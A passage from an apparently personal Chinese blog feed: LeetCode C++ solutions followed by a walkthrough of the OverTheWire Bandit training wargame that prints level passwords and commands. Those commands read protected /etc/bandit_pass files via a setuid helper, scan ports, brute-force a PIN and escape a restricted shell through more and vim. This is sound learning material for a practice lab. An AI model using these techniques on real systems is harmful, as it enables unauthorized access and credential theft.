数目。</p><p>思路：这题描述地花里胡哨，但看完例子仔细想一下就可以发现这一题就是上一题的变体，目标是要找出fruits中最长的只含有两种元素的子串长度。依然使用滑动窗口，如果窗口右侧元素不是两个篮子之一，则更新长度，将两个篮子分别改为右侧-1和右侧。</p><ul><li>考虑右边一颗不在篮子里</li><li>如果当前只用了一个篮子（前面的都为一种），则左侧不变，第二个篮子为右侧。</li><li>如果两个篮子都用了，第二个篮子变为窗口右侧，第一个篮子变为第二个篮子，窗口左侧移动到原第二个篮子第一次出现的位置</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">totalFruit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; tree)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (tree.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = tree.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> head&#123;<span class="hljs-number">0</span>&#125;,tail&#123;<span class="hljs-number">0</span>&#125;;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;table;<br>        <span class="hljs-type">int</span> ans&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">while</span> (tail&lt;n)&#123;<br>            table[tree[tail++]]++;<br>            <span class="hljs-keyword">while</span> (table.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-keyword">if</span> (table[tree[head]]==<span class="hljs-number">1</span>)&#123;<br>                    table.<span class="hljs-built_in">erase</span>(tree[head]);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    table[tree[head]]--;<br>                &#125;<br>                head++;<br>            &#125;<br>            ans = <span class="hljs-built_in">max</span>(ans,tail-head);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76.最小覆盖子串"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/">76.最小覆盖子串</a><a href="https://leetcode-cn.com/problems/minimum-window-substring/"></a></h4><p>给你一个字符串 s 、一个字符串 t 。返回 s 中涵盖 t 所有字符的最小子串。如果 s 中不存在涵盖 t 所有字符的子串，则返回空字符串 “” 。</p><p>注意：</p><pre><code class="hljs">对于 t 中重复字符，我们寻找的子字符串中该字符数量必须不少于 t 中该字符数量。如果 s 中存在这样的子串，我们保证它是唯一的答案。</code></pre><p>思路：</p><h3 id="6-螺旋矩阵（出现率较高）"><a href="#6-螺旋矩阵（出现率较高）" class="headerlink" title="6. 螺旋矩阵（出现率较高）"></a>6. 螺旋矩阵（出现率较高）</h3><h4 id="59-螺旋矩阵"><a href="#59-螺旋矩阵" class="headerlink" title="59.螺旋矩阵"></a><a href="https://leetcode-cn.com/problems/spiral-matrix-ii/">59.螺旋矩阵</a></h4><p>给你一个正整数 <code>n</code> ，生成一个包含 <code>1</code> 到 <code>n2</code> 所有元素，且元素按顺时针顺序螺旋排列的 <code>n x n</code> 正方形矩阵 <code>matrix</code> 。</p><img src="/Users/tingyi/Library/Application Support/typora-user-images/image-20220218205853415.png" alt="image-20220218205853415" style="zoom:50%;" /><p>思路：这种类型的题目不涉及什么算法，只要能正确描述流程即可。难点在于正确分析边界</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">res</span>(n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n, <span class="hljs-number">0</span>)); <span class="hljs-comment">// 使用vector定义一个二维数组</span><br>       <span class="hljs-type">int</span> startx = <span class="hljs-number">0</span>, starty = <span class="hljs-number">0</span>; <span class="hljs-comment">// 定义每循环一个圈的起始位置</span><br>       <span class="hljs-type">int</span> loop = n / <span class="hljs-number">2</span>; <span class="hljs-comment">// 每个圈循环几次，例如n为奇数3，那么loop = 1 只是循环一圈，矩阵中间的值需要单独处理</span><br>       <span class="hljs-type">int</span> mid = n / <span class="hljs-number">2</span>; <span class="hljs-comment">// 矩阵中间的位置，例如：n为3， 中间的位置就是(1，1)，n为5，中间位置为(2, 2)</span><br>       <span class="hljs-type">int</span> count = <span class="hljs-number">1</span>; <span class="hljs-comment">// 用来给矩阵中每一个空格赋值</span><br>       <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>; <span class="hljs-comment">// 每一圈循环，需要控制每一条边遍历的长度</span><br>       <span class="hljs-type">int</span> i,j;<br>       <span class="hljs-keyword">while</span> (loop --) &#123;<br>           i = startx;<br>           j = starty;<br><br>           <span class="hljs-comment">// 下面开始的四个for就是模拟转了一圈</span><br>           <span class="hljs-comment">// 模拟填充上行从左到右(左闭右开)</span><br>           <span class="hljs-keyword">for</span> (j = starty; j &lt; starty + n - offset; j++) &#123;<br>               res[startx][j] = count++;<br>           &#125;<br>           <span class="hljs-comment">// 模拟填充右列从上到下(左闭右开)</span><br>           <span class="hljs-keyword">for</span> (i = startx; i &lt; startx + n - offset; i++) &#123;<br>               res[i][j] = count++;<br>           &#125;<br>           <span class="hljs-comment">// 模拟填充下行从右到左(左闭右开)</span><br>           <span class="hljs-keyword">for</span> (; j &gt; starty; j--) &#123;<br>               res[i][j] = count++;<br>           &#125;<br>           <span class="hljs-comment">// 模拟填充左列从下到上(左闭右开)</span><br>           <span class="hljs-keyword">for</span> (; i &gt; startx; i--) &#123;<br>               res[i][j] = count++;<br>           &#125;<br><br>           <span class="hljs-comment">// 第二圈开始的时候，起始位置要各自加1， 例如：第一圈起始位置是(0, 0)，第二圈起始位置是(1, 1)</span><br>           startx++;<br>           starty++;<br><br>           <span class="hljs-comment">// offset 控制每一圈里每一条边遍历的长度</span><br>           offset += <span class="hljs-number">2</span>;<br>       &#125;<br><br>       <span class="hljs-comment">// 如果n为奇数的话，需要单独给矩阵最中间的位置赋值</span><br>       <span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span>) &#123;<br>           res[mid][mid] = count;<br>       &#125;<br>       <span class="hljs-keyword">return</span> res;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Leetcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wargame Bandit</title>
    <link href="/2022/02/04/2022-2-4-Wargame-Bandit/"/>
    <url>/2022/02/04/2022-2-4-Wargame-Bandit/</url>
    
    <content type="html"><![CDATA[<blockquote><p> Bandit是over The Wire中最基础的一个游戏，旨在帮助游戏者熟悉linux命令行操作。</p></blockquote><p>前面的几个level较为简单，所以这里只是些重点</p><ul><li>SSH 连接：<code>-p</code>指定端口号，格式为<code>ssh name@host</code></li><li>Open dash-filename: <code>cat ./-</code></li><li>Space in filename: <code>cat &quot;space in filename&quot;</code></li><li>Find hidden file: <code>cat . (tab)</code></li></ul><h4 id="Level-6-→-7"><a href="#Level-6-→-7" class="headerlink" title="Level 6 → 7"></a>Level 6 → 7</h4><blockquote><p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p></blockquote><ul><li><p>owned by user bandit7</p></li><li><p>owned by group bandit6</p></li><li><p>33 bytes in size</p></li><li><p>在根目录使用find会有很多权限报警，所以使用<code>2&gt;/dev/null</code>,原因：<em>2&gt;&#x2F;dev&#x2F;null redirects error messages to null so that they do not show on stdout.</em></p></li></ul><p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p><p>得到如下结果：<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1x5ts6g3j314203ggm5.jpg" alt="image-20220204155710620"></p><p>Key: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p><h4 id="Level-7-→-8"><a href="#Level-7-→-8" class="headerlink" title="Level 7 → 8"></a>Level 7 → 8</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p></blockquote><p>这一题是要找在millionth这个单词，用vim打开后可以发现文档非常大，在normal模式输入命令<code>/millionth</code>回车后即可找到答案。</p><p>Key: cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p><p>方法2: <code>cat data.txt | grep millionth</code>![image-20220204160404915](&#x2F;Users&#x2F;tingyi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220204160404915.png)</p><h4 id="Level-8-gt-9"><a href="#Level-8-gt-9" class="headerlink" title="Level 8 &gt; 9"></a>Level 8 &gt; 9</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p></blockquote><p>这一题的任务是找到文件中只出现一次的行。自然地想到先进行排序，在统计频次，命令如下</p><p><code>sort data.txt | uniq -c</code> </p><p>可以顺利找到频数为1的Key：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR， 而其他行的频数都为10。或者也可以使用<code>uniq -u</code>直接获取。<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1xr3jo3pj30nw02e3ys.jpg" alt="image-20220204161738775"></p><h4 id="Level-9-gt-10"><a href="#Level-9-gt-10" class="headerlink" title="Level 9 &gt; 10"></a>Level 9 &gt; 10</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, preceded by several ‘&#x3D;’ characters.</p></blockquote><p>找到文件中在一些‘&#x3D;’之后的可读部分。尝试使用<code>cat data.txt | grep ===</code>失败，使用vim打开后查找，输入<code>\===</code>回车后按<code>n</code>选择下一个，几次后找到key:truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p><p>查找资料后，发现第一次尝试不成功的原因在文件中含有二进制数据所以不可读。首先将其转为字符串格式，再选取开头为<code>=</code>的行即可。命令如下：</p><p><code>cat data.txt | strings | grep =</code><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1y7dooz6j30s80e4wfr.jpg" alt="image-20220204163310896"></p><h4 id="Level-10-gt-11"><a href="#Level-10-gt-11" class="headerlink" title="Level 10 &gt; 11"></a>Level 10 &gt; 11</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p></blockquote><p>文件中的内容是使用base64进行编码的，<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1ygauvy2j312a02eq3g.jpg" alt="image-20220204164153180"></p><p>所以需要进行解码。输入命令<code>base64 -d data.txt</code>即可得到key：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1yhpa7p3j30rm02odg9.jpg" alt="image-20220204164313867"></p><h4 id="Level-11-gt-12"><a href="#Level-11-gt-12" class="headerlink" title="Level 11 &gt; 12"></a>Level 11 &gt; 12</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p></blockquote><p>文件中的所有字母都经过了ROT13加密，解密方法为$m &#x3D; c+(26-13) \rm, mod,  26$。使用<code>tr</code>功能可以转换或删除字符。用法为<code>tr [SET1][SET2]</code>其中SET1中的每一个字符都会被替换到SET2，所以可以得到key：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz1yz9u4tfj30xy02imxn.jpg" alt="image-20220204170007426"></p><h4 id="Level-12-gt-13"><a href="#Level-12-gt-13" class="headerlink" title="Level 12 &gt; 13"></a>Level 12 &gt; 13</h4><blockquote><p>The password for the next level is stored in the file <strong>data.txt</strong>, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under &#x2F;tmp in which you can work using mkdir. For example: mkdir &#x2F;tmp&#x2F;myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p></blockquote><p>在完成创建目录和复制操作后，使用<code>xxd -r</code>将hexdump数据转化为binary数据。再使用<code>file</code>命令，得到此文件为gzip压缩文件，解压缩后重复以上步骤直到得到最终的key：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz204oabraj30rk02mq3d.jpg" alt="image-20220204173953493"></p><h4 id="Level-13-gt-14"><a href="#Level-13-gt-14" class="headerlink" title="Level 13 &gt; 14"></a>Level 13 &gt; 14</h4><blockquote><p>The password for the next level is stored in <strong>&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14 and can only be read by user bandit14</strong>. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. <strong>Note:</strong> <strong>localhost</strong> is a hostname that refers to the machine you are working on</p></blockquote><blockquote><p>参考资料：<a href="https://help.ubuntu.com/community/SSH/OpenSSH/Keys">https://help.ubuntu.com/community/SSH/OpenSSH/Keys</a></p></blockquote><p>登录后，有如下的ssh私钥<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz20b185wgj30v20u0aks.jpg" alt="image-20220204174601218" style="zoom:50%;" /></p><p>使用<code>ssh</code>的身份验证登录模式即可，输入以下命令即可登录bandit14</p><p><code>ssh bandit14@localhost -i ./sshkey.private</code></p><h4 id="Level-14-gt-15"><a href="#Level-14-gt-15" class="headerlink" title="Level 14 &gt; 15"></a>Level 14 &gt; 15</h4><blockquote><p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30000 on localhost</strong>.</p></blockquote><p>首先我们需要找到本题的密码，位置如上一题所说。Key: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e。而向特定端口提交数据需呀用到<code>natcat</code>工具，命令如下：</p><p><code>nc localhost 30000 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</code></p><p>得到key：BfMYroe26WYalil77FoDi9qh59eK5xNr</p><h4 id="Level-15-gt-16"><a href="#Level-15-gt-16" class="headerlink" title="Level 15 &gt; 16"></a>Level 15 &gt; 16</h4><blockquote><p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30001 on localhost</strong> using SSL encryption.</p><p><strong>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</strong></p></blockquote><p>本题同样是发送消息并获取回复，但不同是要使用SSL加密。输入以下命令：</p><p><code>openssl s_client -connect localhost:30001</code></p><p>得到key：cluFn7wTiGryunymYOu4RcffSxQluehd<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz213g3sd7j30ue0cwjso.jpg" alt="image-20220204181319532"></p><h4 id="Level-16-gt-17"><a href="#Level-16-gt-17" class="headerlink" title="Level 16 &gt; 17"></a>Level 16 &gt; 17</h4><blockquote><p>The credentials for the next level can be retrieved by submitting the password of the current level to <strong>a port on localhost in the range 31000 to 32000</strong>. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p></blockquote><p>本题首先要进行端口扫描，判断在31000到32000之间有哪些端口正在监听。输入命令<code>nmap -p 31000-32000 localhost</code>得到共有5个端口开放。</p><p><code> *nmap -v -A -T4 -p 31000-32000 localhost*</code> 可以得到更完整的结果，<code>-A</code>用来检测OS和版本，脚本等， <code>-v</code>提高结果的可读性，<code>T4</code>为速度模板。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz21gnwmrzj30zc0ggwh6.jpg" alt="image-20220204182600451"></p><p>接下来就是分别确定这些端口中那些使用ssl。输入命令：<code>openssl s_client -connect localhost:31790</code>得到如下的私钥：<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz21qe2vswj30u00u2wo3.jpg" alt="image-20220204183522925"  /></p><p>在&#x2F;tmp&#x2F;下新建一个文件夹保存此私钥，并尝试使用ssh登录，结果为此私钥权限太低，应该改为只有我可以读取。修改其权限：<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz225svgoqj313y090q55.jpg" alt="image-20220204185010304"></p><p>此处有一个小技巧，使用<code>chmod</code>命令时，三位数字分别代表user, group和all，写，读，执行的权限分别为4，2，1.进行组合就可以方便地修改权限了。所以这里我们输入命令<code>chmod 600 pub.key</code>，可以看到，此时只有user有读写权限。<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz22agrrcoj30t604wmxv.jpg" alt="image-20220204185439412"></p><p>再次尝试使用ssh登录，竟然又没有登录进去，这次又提示需要输入passphrase。查阅一些资料后发现此处应该是服务器的问题，应该可以正常登录，所以我找到了进入下一题的key：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</p><h4 id="Level-17-gt-18"><a href="#Level-17-gt-18" class="headerlink" title="Level 17 &gt; 18"></a>Level 17 &gt; 18</h4><blockquote><p> There are 2 files in the homedirectory: <strong>passwords.old and passwords.new</strong>. The password for the next level is in <strong>passwords.new</strong> and is the only line that has been changed between <strong>passwords.old and passwords.new</strong></p></blockquote><p>这一题是要找到passwords.old和password.new之间不同的一行。通过查看<code>diff</code>命令的手册，找到适合的选项为<code>--supress-common-lines</code> 意为不输出相同的行，所以输入以下命令即可得到key：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p><p><code>diff --suppress-common-lines passwords.old passwords.new</code><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz388f77m3j313m070gmj.jpg" alt="image-20220205190549050"></p><h4 id="Level-18-gt-19"><a href="#Level-18-gt-19" class="headerlink" title="Level 18 &gt; 19"></a>Level 18 &gt; 19</h4><blockquote><p>The password for the next level is stored in a file <strong>readme</strong> in the homedirectory. Unfortunately, someone has modified <strong>.bashrc</strong> to log you out when you log in with SSH.</p></blockquote><p>由于<code>.bashrc</code>被修改，导致登录失败并出现以下提示：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz38bd3hp6j30sa056dg3.jpg" alt="image-20220205190842229"></p><p>经过一连串的尝试后找到避免在登录时source .bashrc的方法为使用<code>-T</code>参数，意为关闭伪终端分配，意思是在建立连接时不分配shell，也就不运行.bashrc。最终得到key：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz38xfzisoj30qs04kjrn.jpg" alt="image-20220205192953748"></p><h4 id="Level-19-gt-20"><a href="#Level-19-gt-20" class="headerlink" title="Level 19 &gt; 20"></a>Level 19 &gt; 20</h4><blockquote><p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (&#x2F;etc&#x2F;bandit_pass), after you have used the setuid binary.</p></blockquote><p>本题要求我们运行目录下的<code>bandit0-do</code>程序，此程序的作用是以其他用户的身份运行命令，而下一题的key只有bandit20可以读取，所以想到可以用此程序来打开key文件，命令如下：</p><p><code>./bandit20-do cat /etc/bandit_pass/bandit20</code></p><p>可以得到key：GbKksEFF4yrVs6il55v6gwY5aVje5f0j<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz399oxcznj30zu02kjru.jpg" alt="image-20220205194140228"></p><h4 id="Level-20-gt-21"><a href="#Level-20-gt-21" class="headerlink" title="Level 20 &gt; 21"></a>Level 20 &gt; 21</h4><blockquote><p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p><p><strong>NOTE:</strong> Try connecting to your own network daemon to see if it works as you think</p></blockquote><p>这一题是需要我们将这一题的key通过给的程序发送，来得到下一题的key，想了半天，尝试用<code>nc -l 5000 &amp;</code>新建一个端口后台监听但是没有成功。找了半天才发现还有一个提示：NOTE: To beat this level, you need to login twice: once to run the setuid command, and once to start a network daemon to which the setuid will connect. 所以解决方法为，在一个终端中新建监听<code>nc -l 1234 &lt; /etc/bandit_pass/bandit20</code>，在另一个终端中输入<code>./suconnect 1234</code>即可获取key：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p><h4 id="Level-21-gt-22"><a href="#Level-21-gt-22" class="headerlink" title="Level 21 &gt; 22"></a>Level 21 &gt; 22</h4><blockquote><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p></blockquote><p>这一题是让我们了解一下基于时间的任务管理工具<code>cron</code>的应用，打开上述目录后，可以看到下一题的cronjob，打开后发现指向一个脚本文件，打开此脚本文件可以看到其将下一关的key写入了tmp文件夹中，打开这个文件即可获得key：t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4i7gf5cfj312y062jsr.jpg" alt="image-20220206213625968"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4ic38mtqj313o02kt96.jpg" alt="image-20220206214057342"></p><h4 id="Level-22-gt-23"><a href="#Level-22-gt-23" class="headerlink" title="Level 22 &gt; 23"></a>Level 22 &gt; 23</h4><blockquote><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p><p><strong>NOTE:</strong> Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p></blockquote><p>和上题类似，首先来到<code>/etc/cron.d</code>中查看下一题的任务，然后查看其具体脚本。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4iecd6msj30z803m757.jpg" alt="image-20220206214306874"></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4if8gdvmj313a0aodhi.jpg" alt="image-20220206214358164"></p><p>通过脚本我们可以看到脚本新建了两个变量，<code>myname=bandit23</code>,<code>mytarget</code>是将一个字符串通过<code>md5</code>加密后在剪掉一些内容，最终下一题的key存入了最终结果的文件夹，我们也做同样的操作后得到了最终key：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4ilcl7goj313e060wfx.jpg" alt="image-20220206214951138"></p><h4 id="Level-23-gt-24"><a href="#Level-23-gt-24" class="headerlink" title="Level 23 &gt; 24"></a>Level 23 &gt; 24</h4><blockquote><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p><p><strong>NOTE:</strong> This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p><p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p></blockquote><p>这一题不再是使用写好的脚本，而是自己写脚本，我们也要从厨子做菜变成看兵法了。第一步同样是打开原来的脚本，可以看到首先脚本会进入一个目录，然后执行目录下的所有脚本之后将其删除。所以我们要进入目录然后写一个脚本，将下一题的密码提取出来。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4iw4b8zaj310a0mojtl.jpg" alt="image-20220206220011968"></p><p>使用vim编写以下脚本；注意需要修改权限让所有人都可以运行<code>chmod 777</code>，然后等待一分钟。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4j50fwozj312w04adg3.jpg" alt="image-20220206220843357"></p><p>最终得到key：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4jcinl01j30ve05wwg1.jpg" alt="image-20220206221555218"></p><h4 id="Level-24-gt-25"><a href="#Level-24-gt-25" class="headerlink" title="Level 24 &gt; 25"></a>Level 24 &gt; 25</h4><blockquote><p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p></blockquote><p>本题需要暴力破解一个四位的pin，题意应该就是想让我们写一个脚本来破解。具体想法为将每一个可能的密码组合都写入到一个文件中，然后将此文件作为输入传到监听端口，并将结果存入另一个文件中。最后在此文件中找到key。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4knro5uxj310o0723z8.jpg" alt="image-20220206230122174"></p><p>将输出存入<code>adam.txt</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz4kkufvdjj313i01qglx.jpg" alt="image-20220206225832587"></p><p>由于输出中有很多错误信息，所以用<code>sort</code>功能找到唯一不同的一行，key：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</p><h4 id="Level-25-gt-26"><a href="#Level-25-gt-26" class="headerlink" title="Level 25 &gt; 26"></a>Level 25 &gt; 26</h4><blockquote><p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not <strong>&#x2F;bin&#x2F;bash</strong>, but something else. Find out what it is, how it works and how to break out of it.</p></blockquote><p>登录后有一个ssh私钥，使用其登录后立刻又退出了。通过查阅资料，知道shell在&#x2F;etc&#x2F;passwd文件中指定，所以查看此文件中bandit26相关部分，发现使用的是&#x2F;usr&#x2F;bin&#x2F;showtest而不是bash。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz7zdmljbnj313m02g3z4.jpg" alt="image-20220209214717760"></p><p>查看此文件，发现是一个脚本，作用是调用了more显示了一个文件，然后就退出了。之前没看到more是因为窗口太大了，缩小后即可看到。所以我们就要利用more来执行命令获取key。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz7ziwnunpj30qg08a3yz.jpg" alt="image-20220209215222900"></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz7zizv9h7j313c08gjrt.jpg" alt="image-20220209215228092"></p><p>这里不知道该怎么办了，查阅了一些资料，知道more可以执行命令，有以下几种方式，一是直接!command，尝试输入!&#x2F;bin&#x2F;sh或!&#x2F;bin&#x2F;bash都没有成功。二是输入v进入vim模式再!command，但同样没有成功。最后使用vim模式下的:e file功能成功获取到了key：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz7zog5m73j313w07qmyj.jpg" alt="image-20220209215742207"></p><h4 id="Level-26-gt-27"><a href="#Level-26-gt-27" class="headerlink" title="Level 26 &gt; 27"></a>Level 26 &gt; 27</h4><blockquote><p>Good job getting a shell! Now hurry and grab the password for bandit27!</p></blockquote><p>再次登录，仍然是一登录就退出。同样的进入vim模式，使用:set命令将shell设置为&#x2F;bin&#x2F;sh，再:sh即可进入。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz809wma7bj313u07qjse.jpg" alt="image-20220209221818404"></p><p>看到进入shell后有一个文件，和之前一样是以bandit27的权限运行命令，所以直接输出key：3ba3118a22e93127a4ed485be72ef5ea</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz80celbyfj30u205w0tj.jpg" alt="image-20220209222041951"></p><h4 id="Level-27-gt-28"><a href="#Level-27-gt-28" class="headerlink" title="Level 27 &gt; 28"></a>Level 27 &gt; 28</h4><blockquote><p>There is a git repository at <code>ssh://bandit27-git@localhost/home/bandit27-git/repo</code>. The password for the user <code>bandit27-git</code> is the same as for the user <code>bandit27</code>.</p><p>Clone the repository and find the password for the next level.</p></blockquote><p>这一题要求我们克隆一个repo，我们将它克隆到&#x2F;tmp目录下即可，克隆时需要输入这一题的key。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz80feq3nvj311q05yab7.jpg" alt="image-20220209222336783"></p><p>得到下一题的key：0ef186ac70e04ea33b4c1853d2526fa2</p><h4 id="Level-28-gt-29"><a href="#Level-28-gt-29" class="headerlink" title="Level 28 &gt; 29"></a>Level 28 &gt; 29</h4><blockquote><p>There is a git repository at <code>ssh://bandit28-git@localhost/home/bandit28-git/repo</code>. The password for the user <code>bandit28-git</code> is the same as for the user <code>bandit28</code>.</p></blockquote><blockquote><p>Clone the repository and find the password for the next level.</p></blockquote><p>和上一题相同，先cd到&#x2F;tmp，克隆时发现已经存在repo文件夹，只需要在之后重新起一个名字即可。打开文件，里面却没有有用的信息。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz80pf8g7oj30o009umy2.jpg" alt="image-20220209223314206"></p><p>既然是git仓库，我们应该可以通过查看log获取到一些信息。输入git log果然可以看到添加了信息。使用git show命令即可看到password修改前的内容：key：bbc96594b4e001778eee9975372716b2</p><p><img 